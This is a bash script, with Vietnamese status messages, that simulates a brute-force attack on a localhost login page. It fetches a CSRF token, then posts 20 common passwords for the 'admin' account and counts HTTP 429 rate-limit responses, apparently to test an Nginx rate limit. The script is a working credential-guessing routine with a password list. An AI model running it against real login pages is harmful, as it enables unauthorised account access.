#!/usr/bin/env bash
set -uo pipefail

TARGET_URL="https://localhost/login"
TARGET_USER="admin"
COOKIE_JAR="/tmp/bruteforce_cookie.txt"
PASSWORDS=(
  "123456" "password" "admin123" "welcome" "fleet2024"
  "root" "toor" "qwerty" "letmein" "football"
  "master" "dragon" "monkey" "sunshine" "superman"
  "shadow" "iloveyou" "princess" "trustno1" "FleetWrong@2026"
)

echo "================================================================================"
echo "KICH BAN MO PHONG TAN CONG BRUTE FORCE VAO TRANG DANG NHAP"
echo "Muc tieu: $TARGET_URL | User: $TARGET_USER | So luot thu: ${#PASSWORDS[@]}"
echo "Thoi diem bat dau: $(date '+%Y-%m-%d %H:%M:%S %Z')"
echo "================================================================================"

count=0
success_count=0
rate_limited_count=0

for pass in "${PASSWORDS[@]}"; do
  count=$((count + 1))
  rm -f "$COOKIE_JAR"

  # 1. Lay CSRF token
  LOGIN_PAGE=$(curl -k -s -c "$COOKIE_JAR" "$TARGET_URL")
  CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP 'name="_csrf" value="\K[^"]+' | head -n 1 || true)

  if [[ -z "$CSRF_TOKEN" ]]; then
    # Neu Nginx da chan 429, trang HTML co the khong tra ve form dang nhap
    HTTP_CODE=$(curl -k -s -o /dev/null -w "%{http_code}" "$TARGET_URL")
    if [[ "$HTTP_CODE" == "429" ]]; then
      rate_limited_count=$((rate_limited_count + 1))
      echo "[$count/20] [$(date '+%H:%M:%S')] Thu mat khau: '$pass' -> HTTP 429 (Bị chặn bởi Rate Limiting)"
      sleep 0.5
      continue
    fi
  fi

  # 2. Gui request dang nhap POST voi mat khau thu nghiem
  HTTP_CODE=$(curl -k -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "$TARGET_URL" \
    -d "username=$TARGET_USER&password=$pass&_csrf=$CSRF_TOKEN" \
    -w "%{http_code}" -o /dev/null)

  if [[ "$HTTP_CODE" == "429" ]]; then
    rate_limited_count=$((rate_limited_count + 1))
    echo "[$count/20] [$(date '+%H:%M:%S')] Thu mat khau: '$pass' -> HTTP 429 (Rate Limit Active)"
  elif [[ "$HTTP_CODE" == "302" ]]; then
    echo "[$count/20] [$(date '+%H:%M:%S')] Thu mat khau: '$pass' -> HTTP 302 (LOGIN_FAILED / Redirect)"
  else
    echo "[$count/20] [$(date '+%H:%M:%S')] Thu mat khau: '$pass' -> HTTP $HTTP_CODE"
  fi

  sleep 0.5
done

echo "================================================================================"
echo "Ket thuc mo phong tan cong: $count yeu cau da gui."
echo "So yeu cau nhan 429: $rate_limited_count / $count"
echo "Thoi diem ket thuc: $(date '+%Y-%m-%d %H:%M:%S %Z')"
echo "================================================================================"
